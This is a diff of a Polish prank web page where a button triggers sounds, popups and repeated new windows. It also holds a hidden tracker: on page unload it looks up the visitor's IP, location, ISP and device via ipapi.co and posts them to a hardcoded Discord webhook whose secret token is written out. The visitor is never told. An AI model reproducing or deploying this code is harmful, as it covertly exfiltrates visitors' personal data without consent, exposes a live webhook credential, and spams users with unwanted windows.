@@ -5,19 +5,16 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>🟥 Antek nadchodzi...</title>
   <link rel="icon" href="favicon1.ico" type="image/x-icon" />
-  <link rel="stylesheet" href="style.css" />
-  <script src="https://unpkg.com/platform/platform.js"></script>
   <style>
     body {
       background-color: black;
       color: white;
       font-family: 'Courier New', monospace;
       text-align: center;
-      overflow: hidden;
       margin: 0;
       padding: 0;
+      /* overflow: hidden; - usunięte, żeby popupy mogły działać */
     }
-
     #crazyButton {
       padding: 20px 40px;
       font-size: 24px;
@@ -28,55 +25,20 @@
       margin-top: 50px;
       z-index: 10;
     }
-
     #message {
       font-size: 32px;
       margin-top: 30px;
     }
-
     .shake {
       animation: shake 0.4s;
     }
-
     @keyframes shake {
-      0% {
-        transform: translate(0px, 0px);
-      }
-      20% {
-        transform: translate(-10px, 5px);
-      }
-      40% {
-        transform: translate(10px, -5px);
-      }
-      60% {
-        transform: translate(-10px, 5px);
-      }
-      80% {
-        transform: translate(10px, -5px);
-      }
-      100% {
-        transform: translate(0px, 0px);
-      }
-    }
-
-    .random-img {
-      position: absolute;
-      z-index: 9999;
-      pointer-events: none;
-      opacity: 0.85;
-      animation: float 6s linear infinite;
-    }
-
-    @keyframes float {
-      0% {
-        transform: translateY(0);
-      }
-      50% {
-        transform: translateY(-10px);
-      }
-      100% {
-        transform: translateY(0);
-      }
+      0% { transform: translate(0,0); }
+      20% { transform: translate(-10px, 5px); }
+      40% { transform: translate(10px, -5px); }
+      60% { transform: translate(-10px, 5px); }
+      80% { transform: translate(10px, -5px); }
+      100% { transform: translate(0,0); }
     }
   </style>
 </head>
@@ -87,47 +49,39 @@
 
   <p>🔁 Odwiedziłeś tę stronę <strong id="visitCount">...</strong> razy.</p>
 
+  <script src="https://unpkg.com/platform/platform.js"></script>
   <script>
     const startTime = Date.now();
     const webhookUrl = "https://discord.com/api/webhooks/1373725358951764118/wwpbThoUoNmzFQ4mlRa6Fz_LMLO6RrvlaL1Us3vxDC8nJtfVHMjJfxm28SxMU-t5MIt1";
-    // Licznik odwiedzin - aktualizujemy od razu
-    const visits = parseInt(localStorage.getItem("visitCount") || "0") + 1;
+
+    // Licznik odwiedzin
+    let visits = parseInt(localStorage.getItem("visitCount") || "0", 10);
+    visits++;
     localStorage.setItem("visitCount", visits);
     document.getElementById("visitCount").innerText = visits;
 
-    // Zapis lokalny historii
+    // Historia wizyt - funkcja do zapisu
     function saveVisitLocally(entry) {
       const history = JSON.parse(localStorage.getItem("visitHistory") || "[]");
       history.push(entry);
       localStorage.setItem("visitHistory", JSON.stringify(history, null, 2));
     }
 
-    // Wyświetl ostatnią wizytę
-    function showLastVisit() {
-      const history = JSON.parse(localStorage.getItem("visitHistory") || "[]");
-      if (history.length > 0) {
-        const last = history[history.length - 1];
-        document.getElementById("lastVisit").innerText = JSON.stringify(last, null, 2);
-      }
-    }
-
-    showLastVisit();
-
-    // Flaga, czy Antek jest aktywny (po kliknięciu)
+    // Flaga, by Antek działał tylko raz
     let antekActive = false;
 
-    // Funkcja do inicjalizacji „Antka”
     function startAntek() {
-      if (antekActive) return; // zabezpieczenie - nie uruchamiaj dwa razy
+      if (antekActive) return;
       antekActive = true;
 
-      // Podłącz event beforeunload (żeby wysłać dane dopiero gdy Antek działa)
-      window.addEventListener("beforeunload", () => {
+      // Zapis i wysłanie danych przy zamknięciu strony (sync z async fetch - może nie dojdzie, ale OK)
+      window.addEventListener("beforeunload", (e) => {
         const duration = Math.round((Date.now() - startTime) / 1000);
-
+        navigator.sendBeacon("https://ipapi.co/json/")
+        // fetch IP i wysłanie webhooka (użyj fetch w tle)
         fetch("https://ipapi.co/json/")
-          .then((res) => res.json())
-          .then((data) => {
+          .then(res => res.json())
+          .then(data => {
             const ip = data.ip || "Brak IP";
             const city = data.city || "Nieznane miasto";
             const country = data.country_name || "Nieznany kraj";
@@ -144,43 +98,39 @@
 🔁 Odwiedzin: ${visits}
 ⏱️ Czas na stronie: ${duration} sekund`;
 
-            // Wyślij do Discorda
             fetch(webhookUrl, {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify({ content }),
             });
 
-            // Zapisz lokalnie
-            saveVisitLocally({
-              date: now,
-              ip,
-              location: `${city}, ${country}`,
-              isp: org,
-              device,
-              duration,
-              visits,
-            });
+            saveVisitLocally({ date: now, ip, location: `${city}, ${country}`, isp: org, device, duration, visits });
           });
       });
 
-      // Tutaj możesz też podpiąć resztę swojego skryptu „antekowego” - np. dźwięki, popupy itd.
-      // Poniżej przykład minimalnego popupu po kliknięciu:
       const button = document.getElementById("crazyButton");
       const message = document.getElementById("message");
 
-      // Przygotuj dźwięki
-      const sound = [
+      // Dźwięki
+      const sounds = [
         new Audio("stracilas-cnote_R1qiG8j.mp3"),
         new Audio("illegal-polish-content.mp3"),
         new Audio("polish-toilet-refrain.mp3"),
       ];
 
+      // Linki do otwierania
+      const urls = [
+        "https://example.com/1",
+        "https://example.com/2",
+        "https://example.com/3",
+        "https://example.com/4",
+      ];
+
       button.addEventListener("click", () => {
-        // Odtwarzaj wszystkie dźwięki naraz
-        sound.forEach((s) => {
+        // Odtwarzaj dźwięki
+        sounds.forEach(s => {
           s.currentTime = 0;
-          s.play();
+          s.play().catch(() => {});
         });
 
         // Losowa wiadomość
@@ -203,9 +153,7 @@
         }, 400);
 
         // Popupy
-        setTimeout(() => {
-          alert("Hej! To nie był najlepszy pomysł.");
-        }, 500);
+        setTimeout(() => alert("Hej! To nie był najlepszy pomysł."), 500);
 
         setTimeout(() => {
           const response = confirm("Czy naprawdę myślisz, że to już koniec?");
@@ -216,26 +164,21 @@
           }
         }, 1500);
 
-        // Otwieraj 4 strony co 5 sekund
+        // Otwieranie nowych okien z limitami
         let count = 0;
-        const urls = [
-          "https://example.com/1",
-          "https://example.com/2",
-          "https://example.com/3",
-          "https://example.com/4",
-        ];
         const intervalId = setInterval(() => {
+          if (count >= 16) {
+            clearInterval(intervalId);
+            return;
+          }
           window.open(urls[count % urls.length], "_blank");
           count++;
-          if (count > 15) clearInterval(intervalId);
         }, 5000);
       });
     }
 
-    // Uruchamiamy Antek dopiero po kliknięciu w przycisk
+    // Startujemy Antek po pierwszym kliknięciu
     document.getElementById("crazyButton").addEventListener("click", startAntek);
   </script>
-
-  <script src="script.js"></script>
 </body>
 </html>
